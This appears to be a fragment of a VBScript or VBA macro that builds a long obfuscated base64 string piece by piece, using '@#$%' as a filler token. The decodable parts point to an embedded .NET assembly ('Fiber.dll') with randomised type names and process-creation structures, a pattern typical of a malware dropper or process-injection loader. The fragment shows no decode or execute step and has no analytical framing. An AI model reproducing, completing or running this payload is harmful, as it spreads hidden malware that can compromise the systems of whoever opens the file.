hTpxRu = hTpxRu & "@#$%Cg@#$%@#$%@#$%g@#$%kwB3CW4CC@#$%@#$%" 
hTpxRu = hTpxRu & "QK@#$%@#$%@#$%C@#$%CT@#$%MgJF@#$%II@#$%B" 
hTpxRu = hTpxRu & "wo@#$%@#$%@#$%I@#$%JM@#$%+Ql7@#$%gg@#$%M" 
hTpxRu = hTpxRu & "Cg@#$%@#$%@#$%g@#$%kw@#$%ZCpMBC@#$%B@#$%" 
hTpxRu = hTpxRu & "K@#$%@#$%@#$%C@#$%CT@#$%D8KjQII@#$%Fgo@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%I@#$%JM@#$%WgqT@#$%Qg@#$%aCg@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%g@#$%kwBtCpoCC@#$%B8K@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%C@#$%CT@#$%I8KpQII@#$%JQo@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "I@#$%JM@#$%4Qqz@#$%gg@#$%pCg@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "g@#$%kw@#$%cC8ECC@#$%CwK@#$%@#$%@#$%C@#$" 
hTpxRu = hTpxRu & "%CT@#$%DcLxwII@#$%Mwo@#$%@#$%@#$%I@#$%JM" 
hTpxRu = hTpxRu & "@#$%UQua@#$%gg@#$%4Cg@#$%@#$%@#$%g@#$%kw" 
hTpxRu = hTpxRu & "B3C94CC@#$%D0K@#$%@#$%@#$%C@#$%CT@#$%K0L" 
hTpxRu = hTpxRu & "ewII@#$%@#$%gp@#$%@#$%@#$%I@#$%JM@#$%zQu" 
hTpxRu = hTpxRu & "a@#$%gg@#$%HCk@#$%@#$%@#$%g@#$%kwDgC3sCC" 
hTpxRu = hTpxRu & "@#$%@#$%wKQ@#$%@#$%C@#$%CT@#$%@#$%EMewII" 
hTpxRu = hTpxRu & "@#$%EQp@#$%@#$%@#$%I@#$%JM@#$%Igz6@#$%gg" 
hTpxRu = hTpxRu & "@#$%VCk@#$%@#$%@#$%g@#$%kw@#$%7D@#$%MDC@" 
hTpxRu = hTpxRu & "#$%BsKQ@#$%@#$%C@#$%CT@#$%FkMkwEI@#$%Hwp" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%I@#$%JM@#$%egwX@#$%wg@#$%lCk" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%g@#$%kwCWDOQ@#$%C@#$%CkKQ@#$" 
hTpxRu = hTpxRu & "%@#$%C@#$%CT@#$%K8MkwEI@#$%LQp@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%I@#$%JM@#$%4@#$%z6@#$%gg@#$%xCk@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%g@#$%kwDzDJoCC@#$%DYKQ@#$%@#$%C@#$%" 
hTpxRu = hTpxRu & "CT@#$%@#$%YNjQII@#$%P@#$%p@#$%@#$%@#$%I@" 
hTpxRu = hTpxRu & "#$%JM@#$%GQ2a@#$%gg@#$%BCo@#$%@#$%@#$%g@" 
hTpxRu = hTpxRu & "#$%kwBFDZMBC@#$%@#$%UKg@#$%@#$%C@#$%CT@#" 
hTpxRu = hTpxRu & "$%FgN5@#$%@#$%I@#$%CQq@#$%@#$%@#$%I@#$%J" 
hTpxRu = hTpxRu & "M@#$%hw0J@#$%Qg@#$%MCo@#$%@#$%@#$%g@#$%k" 
hTpxRu = hTpxRu & "wCsDUYDC@#$%BYKg@#$%@#$%C@#$%CT@#$%NYNkw" 
hTpxRu = hTpxRu & "EI@#$%Ggq@#$%@#$%@#$%I@#$%JM@#$%9Q2T@#$%" 
hTpxRu = hTpxRu & "Qg@#$%eCo@#$%@#$%@#$%g@#$%kw@#$%pDo0CC@#" 
hTpxRu = hTpxRu & "$%CQKg@#$%@#$%C@#$%CT@#$%EMOmgII@#$%KQq@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%I@#$%JM@#$%Xg76@#$%gg@#$%tCo@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%g@#$%kwB+DqMBC@#$%DEKg@#$%@#$" 
hTpxRu = hTpxRu & "%C@#$%CT@#$%JIOd@#$%MI@#$%Ngq@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%I@#$%JM@#$%sQ57@#$%wg@#$%/Co@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%g@#$%kwDNDscCC@#$%@#$%YKw@#$%@#$%C@#$%C" 
hTpxRu = hTpxRu & "T@#$%OEOkwEI@#$%Cgr@#$%@#$%@#$%I@#$%JM@#" 
hTpxRu = hTpxRu & "$%@#$%Q+T@#$%Qg@#$%OCs@#$%@#$%@#$%g@#$%k" 
hTpxRu = hTpxRu & "w@#$%mD5UDC@#$%BwKw@#$%@#$%C@#$%CT@#$%EM" 
hTpxRu = hTpxRu & "PngEI@#$%I@#$%r@#$%@#$%@#$%I@#$%JM@#$%c@" 
hTpxRu = hTpxRu & "#$%9G@#$%Qg@#$%iCs@#$%@#$%@#$%g@#$%kwCDD" 
hTpxRu = hTpxRu & "0YBC@#$%CQKw@#$%@#$%C@#$%@#$%GGF@#$%@#$%" 
hTpxRu = hTpxRu & "Nw@#$%I@#$%@#$%@#$%@#$%@#$%@#$%C@#$%@#$%" 
hTpxRu = hTpxRu & "BFglg+0@#$%wg@#$%@#$%@#$%@#$%@#$%@#$%I@#" 
hTpxRu = hTpxRu & "$%@#$%EWBpEMYDEg@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "g@#$%@#$%RYJ4QxgMU@#$%@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%C@#$%@#$%BFgzhDG@#$%xY@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%I@#$%@#$%EWD0EMYDG@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%g@#$%@#$%RYCQRzQMa@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%C@#$%@#$%BFgfBHY@#$%x8@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%I@#$%@#$%EWCzEeMDJ" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%g@#$%@#$%RYO" 
hTpxRu = hTpxRu & "sR6QMm@#$%@#$%@#$%@#$%@#$%@#$%C@#$%@#$%B" 
hTpxRu = hTpxRu & "FgMBLy@#$%ys@#$%oCs@#$%@#$%@#$%g@#$%FgBO" 
hTpxRu = hTpxRu & "EvcDL@#$%@#$%8LQ@#$%@#$%C@#$%@#$%R@#$%GU" 
hTpxRu = hTpxRu & "SCwQt@#$%C@#$%0@#$%@#$%@#$%I@#$%JM@#$%iB" 
hTpxRu = hTpxRu & "Lk@#$%DE@#$%MDQ@#$%@#$%@#$%g@#$%kwCcEjoE" 
hTpxRu = hTpxRu & "MQBEN@#$%@#$%@#$%C@#$%CT@#$%LUSmgIx@#$%F" 
hTpxRu = hTpxRu & "g0@#$%@#$%@#$%I@#$%JM@#$%yRLk@#$%DE@#$%a" 
hTpxRu = hTpxRu & "DQ@#$%@#$%@#$%g@#$%kwD0EgsEMQCEN@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%C@#$%CT@#$%@#$%gTRgEy@#$%Iw0@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%I@#$%JM@#$%HBNG@#$%TI@#$%lDQ@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%g@#$%kw@#$%wE5oCMgCoN@#$%@#$%@#$%C@#" 
hTpxRu = hTpxRu & "$%CT@#$%EQTowEy@#$%Lg0@#$%@#$%@#$%I@#$%J" 
hTpxRu = hTpxRu & "M@#$%WBNLBDI@#$%yDQ@#$%@#$%@#$%g@#$%kwBz" 
hTpxRu = hTpxRu & "E/oCMgDYN@#$%@#$%@#$%C@#$%CT@#$%JUTjQIy@" 
hTpxRu = hTpxRu & "#$%P@#$%0@#$%@#$%@#$%I@#$%JM@#$%qRM6BDI@" 
hTpxRu = hTpxRu & "#$%BDU@#$%@#$%@#$%g@#$%kwDSE1gEMg@#$%QNQ" 
hTpxRu = hTpxRu & "@#$%@#$%C@#$%CT@#$%O8TX@#$%Qy@#$%CQ1@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%I@#$%JM@#$%ERRpBDI@#$%RDU@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%g@#$%kw@#$%8FH8EMgBUNQ@#$%@#$%C@#$%" 
hTpxRu = hTpxRu & "CT@#$%FkU5@#$%@#$%y@#$%GQ1@#$%@#$%@#$%I@" 
hTpxRu = hTpxRu & "#$%JM@#$%bRR/BDI@#$%dDU@#$%@#$%@#$%g@#$%" 
hTpxRu = hTpxRu & "kwCQFOQ@#$%MgCENQ@#$%@#$%C@#$%CT@#$%KkUC" 
hTpxRu = hTpxRu & "QEy@#$%@#$%@#$%@#$%@#$%QDFB@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%QD+B@#$%@#$%@#$%@#$%QD+B@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%QBBBw@#$%@#$%@#$%QBiC@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "gBoC@#$%@#$%@#$%@#$%wBwC@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "QCoDw@#$%@#$%@#$%gC4Dw@#$%@#$%@#$%wDLDw@" 
hTpxRu = hTpxRu & "#$%@#$%B@#$%DdDw@#$%@#$%BQDuDw@#$%@#$%Bg" 
hTpxRu = hTpxRu & "@#$%EE@#$%@#$%@#$%Bw@#$%SE@#$%@#$%@#$%C@" 
hTpxRu = hTpxRu & "#$%@#$%eE@#$%@#$%@#$%CQ@#$%vE@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%Cg@#$%7E@#$%@#$%@#$%@#$%QB+E@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%gCFE@#$%@#$%@#$%@#$%QB+E@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%gCFE@#$%@#$%@#$%@#$%QB+E@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%gCFE@#$%@#$%@#$%@#$%QB+E@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%gCFE@#$%@#$%@#$%@#$%Q@#$%6EQ@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%gBCEQ@#$%@#$%@#$%wBOEQ@#$%@#$%B@#$%" 
hTpxRu = hTpxRu & "BVEQ@#$%@#$%BQBgEQ@#$%@#$%@#$%Q@#$%6EQ@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%gBCEQ@#$%@#$%@#$%wBOEQ@#$%@#$%" 
hTpxRu = hTpxRu & "B@#$%BVEQ@#$%@#$%BQCTEQ@#$%@#$%@#$%Q@#$%" 
hTpxRu = hTpxRu & "6EQ@#$%@#$%@#$%gBCEQ@#$%@#$%@#$%QD+EQ@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%g@#$%FEg@#$%@#$%@#$%w@#$%NEg@#$" 
hTpxRu = hTpxRu & "%@#$%B@#$%@#$%UEg@#$%@#$%BQ@#$%ZEg@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%QD+EQ@#$%@#$%@#$%QBTEg@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "QBvEg@#$%@#$%@#$%gB0Eg@#$%@#$%@#$%wBTEg@" 
hTpxRu = hTpxRu & "#$%@#$%B@#$%B4Eg@#$%@#$%B@#$%B4Egk@#$%U@" 
hTpxRu = hTpxRu & "#$%@#$%T@#$%Ck@#$%U@#$%@#$%3@#$%DE@#$%U@" 
hTpxRu = hTpxRu & "#$%BE@#$%EE@#$%U@#$%BQ@#$%FE@#$%U@#$%BQ@" 
hTpxRu = hTpxRu & "#$%Fk@#$%U@#$%BQ@#$%GE@#$%U@#$%BQ@#$%Gk@" 
hTpxRu = hTpxRu & "#$%U@#$%BQ@#$%HE@#$%U@#$%BQ@#$%Hk@#$%U@#" 
hTpxRu = hTpxRu & "$%BV@#$%IE@#$%U@#$%BQ@#$%Ik@#$%U@#$%BQ@#" 
hTpxRu = hTpxRu & "$%JE@#$%U@#$%BQ@#$%KE@#$%U@#$%@#$%3@#$%K" 
hTpxRu = hTpxRu & "k@#$%U@#$%@#$%3@#$%@#$%w@#$%U@#$%@#$%3@#" 
hTpxRu = hTpxRu & "$%BQ@#$%U@#$%@#$%3@#$%Bw@#$%U@#$%@#$%3@#" 
hTpxRu = hTpxRu & "$%CQ@#$%U@#$%@#$%3@#$%BQ@#$%RwQy@#$%Qw@#" 
hTpxRu = hTpxRu & "$%RwQy@#$%Rw@#$%RwQy@#$%SQ@#$%RwQy@#$%dE" 
hTpxRu = hTpxRu & "@#$%EQW@#$%@#$%dk@#$%VwWT@#$%Zk@#$%vgRe@" 
hTpxRu = hTpxRu & "#$%Zk@#$%xwRj@#$%ck@#$%3@#$%Wj@#$%Zk@#$%" 
hTpxRu = hTpxRu & "4@#$%Rs@#$%Zk@#$%U@#$%@#$%3@#$%DQ@#$%Fga" 
hTpxRu = hTpxRu & "q@#$%Tw@#$%WQYy@#$%Tw@#$%YwbN@#$%Tw@#$%U" 
hTpxRu = hTpxRu & "@#$%@#$%3@#$%Mk@#$%8gbg@#$%fE@#$%U@#$%Dl" 
hTpxRu = hTpxRu & "@#$%Zk@#$%WgeY@#$%QkB5wcG@#$%rE@#$%U@#$%" 
hTpxRu = hTpxRu & "@#$%3@#$%DEBU@#$%@#$%3@#$%DkB8@#$%hF@#$%" 
hTpxRu = hTpxRu & "kkBU@#$%@#$%3@#$%CEBU@#$%@#$%3@#$%FEBLgl" 
hTpxRu = hTpxRu & "V@#$%jkBOgla@#$%lkBU@#$%BQ@#$%HEBswlu@#$" 
hTpxRu = hTpxRu & "%nkB8@#$%l1@#$%jEBD@#$%qB@#$%oEBN@#$%qI@" 
hTpxRu = hTpxRu & "#$%kk@#$%UgqU@#$%kk@#$%4@#$%Rs@#$%TEBg@#" 
hTpxRu = hTpxRu & "$%qg@#$%okB0wqs@#$%pkBDgu6@#$%hkBLwvB@#$" 
hTpxRu = hTpxRu & "%kk@#$%SgvP@#$%qEBbgvX@#$%iEBnQvm@#$%iEB" 
hTpxRu = hTpxRu & "w@#$%tQ@#$%Ek@#$%Sgvt@#$%iEB8wtQ@#$%EkBF" 
hTpxRu = hTpxRu & "@#$%zz@#$%kkBNQz/@#$%hEBTgwK@#$%xEBb@#$%" 
hTpxRu = hTpxRu & "wS@#$%xEBjQwe@#$%xEBqQw3@#$%LEBygwk@#$%1" 
hTpxRu = hTpxRu & "kBbgsq@#$%0k@#$%Sgsy@#$%8EBO@#$%05@#$%8k" 
hTpxRu = hTpxRu & "Bdw0/@#$%8kBmg0J@#$%dEBzg1S@#$%9kB4@#$%R" 
hTpxRu = hTpxRu & "j@#$%+EBDQ6I@#$%kk@#$%P@#$%5o@#$%+EBVg7t" 
hTpxRu = hTpxRu & "@#$%ukBdw5v@#$%9kBpg50@#$%9EBxQ6G@#$%+EB" 
hTpxRu = hTpxRu & "Vg7P@#$%uEB9Q6I@#$%uEBFQ+I@#$%tEBOg+i@#$" 
hTpxRu = hTpxRu & "%/EBXw+e@#$%Uk@#$%WBIIB@#$%kCU@#$%@#$%3@" 
hTpxRu = hTpxRu & "#$%GEBU@#$%BQ@#$%CkBU@#$%@#$%3@#$%PkBgxI" 
hTpxRu = hTpxRu & "3B@#$%kCsBJ@#$%BBEC7BI3@#$%Ek@#$%P@#$%5F" 
hTpxRu = hTpxRu & "BPEBbBNLBEk@#$%hxNv@#$%xkCyhNRBPkB5hNYBB" 
hTpxRu = hTpxRu & "kCCRRiBCkCLBRyBBkCUBSEBEkBgRSKBEkBpBQ3@#" 
hTpxRu = hTpxRu & "$%DkCU@#$%CzBEECU@#$%DCBFECU@#$%@#$%3@#$" 
hTpxRu = hTpxRu & "%FkCU@#$%@#$%3@#$%GECU@#$%@#$%3@#$%GkCU@" 
hTpxRu = hTpxRu & "#$%BQ@#$%HECU@#$%@#$%3@#$%HkCU@#$%@#$%3@" 
hTpxRu = hTpxRu & "#$%IECU@#$%@#$%3@#$%IkCU@#$%@#$%jBik@#$%" 
hTpxRu = hTpxRu & "cwPOBC4@#$%WwBa@#$%C4@#$%UwBK@#$%C4@#$%S" 
hTpxRu = hTpxRu & "wBK@#$%C4@#$%Cw@#$%B@#$%C4@#$%awCR@#$%C4" 
hTpxRu = hTpxRu & "@#$%YwCE@#$%C4@#$%QwBK@#$%C4@#$%IwBK@#$%" 
hTpxRu = hTpxRu & "C4@#$%Gw@#$%7@#$%C4@#$%Ew@#$%Y@#$%C4@#$%" 
hTpxRu = hTpxRu & "OwBK@#$%C4@#$%MwBK@#$%C4@#$%KwBK@#$%Ek@#" 
hTpxRu = hTpxRu & "$%cwPfBG@#$%@#$%UwO5BG@#$%@#$%WwPJBGM@#$" 
hTpxRu = hTpxRu & "%UwO5BGM@#$%SwOaBGk@#$%cwPzBIM@#$%SwOaBI" 
hTpxRu = hTpxRu & "M@#$%UwO5BIk@#$%cwM@#$%BaM@#$%awPJBKM@#$" 
hTpxRu = hTpxRu & "%SwOaBKM@#$%YwPJBM@#$%@#$%WwPJBMM@#$%UwO" 
hTpxRu = hTpxRu & "5BMM@#$%kwPBBck@#$%UwM7@#$%O@#$%@#$%WwPJ" 
hTpxRu = hTpxRu & "BOM@#$%UwO5BOM@#$%UwBK@#$%Ok@#$%UwM7@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%BWwPJB@#$%MBSwMUBQMBawPJB@#$%MBY" 
hTpxRu = hTpxRu & "wPJB@#$%MBgwPJB@#$%MBewPJBC@#$%BWwPJBCMB" 
hTpxRu = hTpxRu & "gwPJBCMBUwM7@#$%CMBSwNWBSkBcwOwBUMBYwPJB" 
hTpxRu = hTpxRu & "EMBawPJBEMBgwPJBEMBewPJBI@#$%BUwO5BI@#$%" 
hTpxRu = hTpxRu & "BWwPJBK@#$%BWwPJBK@#$%BUwO5BM@#$%BUwO5BM" 
hTpxRu = hTpxRu & "@#$%BWwPJBO@#$%BUwO5BO@#$%BWwPJB@#$%@#$%" 
hTpxRu = hTpxRu & "CWwPJBC@#$%CWwPJBE@#$%CWwPJBE@#$%CUwO5BG" 
hTpxRu = hTpxRu & "@#$%DWwPJBI@#$%DWwPJBI@#$%DUwO5BC@#$%Miw" 
hTpxRu = hTpxRu & "PJBE@#$%MiwPJBG@#$%MiwPJBI@#$%MiwPJBK@#$" 
hTpxRu = hTpxRu & "%MiwPJBM@#$%MiwPJBO@#$%MiwPJB@#$%@#$%Niw" 
hTpxRu = hTpxRu & "PJBC@#$%NiwPJBE@#$%NiwPJB@#$%E@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%0@#$%@#$%Q@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%Dg@#$%N@#$%XgBsgEf@#$%v0DEwQ" 
hTpxRu = hTpxRu & "F@#$%@#$%E@#$%Bw@#$%F@#$%@#$%g@#$%Bg@#$%" 
hTpxRu = hTpxRu & "J@#$%@#$%g@#$%Cg@#$%J@#$%@#$%@#$%@#$%qQJ" 
hTpxRu = hTpxRu & "K@#$%Q@#$%@#$%pgRP@#$%Q@#$%@#$%E@#$%RU@#" 
hTpxRu = hTpxRu & "$%Q@#$%@#$%sgRZ@#$%Q@#$%@#$%lQbT@#$%Q@#$" 
hTpxRu = hTpxRu & "%@#$%0Qby@#$%Q@#$%@#$%owf3@#$%Q@#$%@#$%L" 
hTpxRu = hTpxRu & "QgP@#$%g@#$%@#$%VQgP@#$%gI@#$%Bg@#$%D@#$" 
hTpxRu = hTpxRu & "%@#$%I@#$%Bw@#$%F@#$%@#$%I@#$%C@#$%@#$%H" 
hTpxRu = hTpxRu & "@#$%@#$%I@#$%CQ@#$%J@#$%@#$%I@#$%Gw@#$%L" 
hTpxRu = hTpxRu & "@#$%@#$%I@#$%Hw@#$%N@#$%@#$%E@#$%IQ@#$%P" 
hTpxRu = hTpxRu & "@#$%@#$%I@#$%I@#$%@#$%P@#$%@#$%I@#$%K@#$" 
hTpxRu = hTpxRu & "%@#$%R@#$%@#$%I@#$%LQ@#$%T@#$%FwQ4RER@#$" 
hTpxRu = hTpxRu & "%RgBHwEm@#$%X0BtwG+@#$%cUBB@#$%HD@#$%E4Q" 
hTpxRu = hTpxRu & "@#$%Q@#$%@#$%@#$%cU@#$%jR@#$%B@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%BxwC4E@#$%E@#$%@#$%@#$%HJ@#$%OMQ@#$%Q@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%cs@#$%DhEB@#$%@#$%@#$%BzQBqEQ" 
hTpxRu = hTpxRu & "E@#$%@#$%@#$%HP@#$%K@#$%R@#$%Q@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%dE@#$%zBEC@#$%@#$%@#$%B0w@#$%hEgE@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%HV@#$%EES@#$%Q@#$%Eg@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%Q@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%B@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%B@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%CgBH@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%K@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%D" 
hTpxRu = hTpxRu & "b@#$%IgC@#$%@#$%@#$%@#$%@#$%@#$%Q@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%o@#$%Ww@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%B@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%CgDkC@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%Q@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%JMV@#$%@#$%@#$%G@#$%@#$%U@#$%" 
hTpxRu = hTpxRu & "Bw@#$%F@#$%@#$%0@#$%D@#$%@#$%O@#$%@#$%w@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%Q@#$%@#$%4@#$%/@#$%Q@#$%@" 
hTpxRu = hTpxRu & "#$%B@#$%@#$%IQD8B@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%j@#$%PwEMQCG@#$%TE@#$%y@#$%FT@#$%FECWwB" 
hTpxRu = hTpxRu & "R@#$%lM@#$%a@#$%I@#$%RmliZXI@#$%Q29tcGls" 
hTpxRu = hTpxRu & "YXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBTeXN0" 
hTpxRu = hTpxRu & "ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2Vz@#$%" 
hTpxRu = hTpxRu & "G1zY29ybGli@#$%C5jdG9y@#$%FZvaWQ@#$%U3lz" 
hTpxRu = hTpxRu & "dGVt@#$%EludDMy@#$%EJvb2xlYW4@#$%UnVudGl" 
hTpxRu = hTpxRu & "tZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGU@#$%RGVi" 
hTpxRu = hTpxRu & "dWdnYWJsZUF0dHJpYnV0ZQBTeXN0ZW0uRGlhZ25v" 
hTpxRu = hTpxRu & "c3RpY3M@#$%RGVidWdnaW5nTW9kZXM@#$%QXNzZW" 
hTpxRu = hTpxRu & "1ibHlUaXRsZUF0dHJpYnV0ZQBTeXN0ZW0uUmVmbG" 
hTpxRu = hTpxRu & "VjdGlvbgBTdHJpbmc@#$%QXNzZW1ibHlEZXNjcml" 
hTpxRu = hTpxRu & "wdGlvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnl" 
hTpxRu = hTpxRu & "BdHRyaWJ1dGU@#$%QXNzZW1ibHlQcm9kdWN0QXR0" 
hTpxRu = hTpxRu & "cmlidXRl@#$%EFzc2VtYmx5Q29weXJpZ2h0QXR0c" 
hTpxRu = hTpxRu & "mlidXRl@#$%EFzc2VtYmx5VHJhZGVtYXJrQXR0cm" 
hTpxRu = hTpxRu & "lidXRl@#$%ENvbVZpc2libGVBdHRyaWJ1dGU@#$%" 
hTpxRu = hTpxRu & "U3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2Vz" 
hTpxRu = hTpxRu & "@#$%Ed1aWRBdHRyaWJ1dGU@#$%QXNzZW1ibHlGaW" 
hTpxRu = hTpxRu & "xlVmVyc2lvbkF0dHJpYnV0ZQBUYXJnZXRGcmFtZX" 
hTpxRu = hTpxRu & "dvcmtBdHRyaWJ1dGU@#$%U3lzdGVtLlJ1bnRpbWU" 
hTpxRu = hTpxRu & "uVmVyc2lvbmluZwBGaWJlci5kbGw@#$%PE1vZHVs" 
hTpxRu = hTpxRu & "ZT4@#$%d2VxRE15OVVFVktWS1dIbFpt@#$%E9iam" 
hTpxRu = hTpxRu & "Vjd@#$%BNeUFwcGxpY2F0aW9u@#$%EZpYmVyLk15" 
hTpxRu = hTpxRu & "@#$%EFwcGxpY2F0aW9uQmFzZQBNaWNyb3NvZnQuV" 
hTpxRu = hTpxRu & "mlzdWFsQmFzaWMuQXBwbGljYXRpb25TZXJ2aWNlc" 
hTpxRu = hTpxRu & "wBNaWNyb3NvZnQuVmlzdWFsQmFzaWM@#$%TXlDb2" 
hTpxRu = hTpxRu & "1wdXRlcgBDb21wdXRlcgBNaWNyb3NvZnQuVmlzdW" 
hTpxRu = hTpxRu & "FsQmFzaWMuRGV2aWNlcwBNeVByb2plY3Q@#$%TXl" 
hTpxRu = hTpxRu & "XZWJTZXJ2aWNlcwBUaHJlYWRTYWZlT2JqZWN0UHJ" 
hTpxRu = hTpxRu & "vdmlkZXJgMQBSZXNvdXJjZXM@#$%RmliZXIuTXku" 
hTpxRu = hTpxRu & "UmVzb3VyY2Vz@#$%E15U2V0dGluZ3M@#$%QXBwbG" 
hTpxRu = hTpxRu & "ljYXRpb25TZXR0aW5nc0Jhc2U@#$%U3lzdGVtLkN" 
hTpxRu = hTpxRu & "vbmZpZ3VyYXRpb24@#$%TXlTZXR0aW5nc1Byb3Bl" 
hTpxRu = hTpxRu & "cnR5@#$%EhvbWU@#$%VG9vbHM@#$%UFJPQ0VTU19" 
hTpxRu = hTpxRu & "JTkZPUk1BVElPTgBWYWx1ZVR5cGU@#$%U1RBUlRV" 
hTpxRu = hTpxRu & "UF9JTkZPUk1BVElPTgBKMzEweDJDN1pxZnNmWDZs" 
hTpxRu = hTpxRu & "bzI@#$%a1@#$%2eTVFcVdFT00xY2lCTk5B@#$%G1" 
hTpxRu = hTpxRu & "fQ29tcHV0ZXJPYmplY3RQcm92aWRlcgBtX0FwcE9" 
hTpxRu = hTpxRu & "iamVjdFByb3ZpZGVy@#$%G1fVXNlck9iamVjdFBy" 
hTpxRu = hTpxRu & "b3ZpZGVy@#$%FVzZXI@#$%bV9NeVdlYlNlcnZpY2" 
hTpxRu = hTpxRu & "VzT2JqZWN0UHJvdmlkZXI@#$%LmNjdG9y@#$%Gdl" 
hTpxRu = hTpxRu & "dF9Db21wdXRlcgBnZXRfR2V0SW5zdGFuY2U@#$%Z" 
hTpxRu = hTpxRu & "2V0X0FwcGxpY2F0aW9u@#$%GdldF9Vc2Vy@#$%Gd" 
hTpxRu = hTpxRu & "ldF9XZWJTZXJ2aWNlcwBkY1FGNnZ4U0FoNk1jbzV" 
hTpxRu = hTpxRu & "1a0E@#$%bmtUZnFXT3NuM0o2aWcxRVNs@#$%EFwc" 
hTpxRu = hTpxRu & "GxpY2F0aW9u@#$%FdlYlNlcnZpY2Vz@#$%EVxdWF" 
hTpxRu = hTpxRu & "scwBv@#$%EdldEhhc2hDb2Rl@#$%EdldFR5cGU@#" 
hTpxRu = hTpxRu & "$%VHlwZQBUb1N0cmluZwBDcmVhdGVfX0luc3Rhbm" 
hTpxRu = hTpxRu & "NlX18@#$%V@#$%BpbnN0YW5jZQBBY3RpdmF0b3I@" 
hTpxRu = hTpxRu & "#$%Q3JlYXRlSW5zdGFuY2U@#$%RGlzcG9zZV9fSW" 
hTpxRu = hTpxRu & "5zdGFuY2VfXwBrSDFEd21Jcjd5TlE1MFZlRVhS@#" 
hTpxRu = hTpxRu & "$%FJ1bnRpbWVIZWxwZXJz@#$%EdldE9iamVjdFZh" 
hTpxRu = hTpxRu & "bHVl@#$%FVqc05QWUlNVjRRRmFJY05Lc1U@#$%Rz" 
hTpxRu = hTpxRu & "V2Q3JxSWJvRDBMVE45SVFrS@#$%BLOHBPMURJblR" 
hTpxRu = hTpxRu & "ndmZyVGpCNTU5@#$%FRsckVGc0lMeWs4Tkg1dEZN" 
hTpxRu = hTpxRu & "Nmc@#$%ZWMyMnVhSW8xZWs1SXRNUWt1W@#$%BSdW" 
hTpxRu = hTpxRu & "50aW1lVHlwZUhhbmRsZQBHZXRUeXBlRnJvbUhhbm" 
hTpxRu = hTpxRu & "RsZQB1MlZneUtJaXR0bzNjOVNYZkFj@#$%EdWQ3M" 
hTpxRu = hTpxRu & "2a0lQVVE1U2tGNGpmSzc@#$%bV9Db250ZXh0@#$%" 
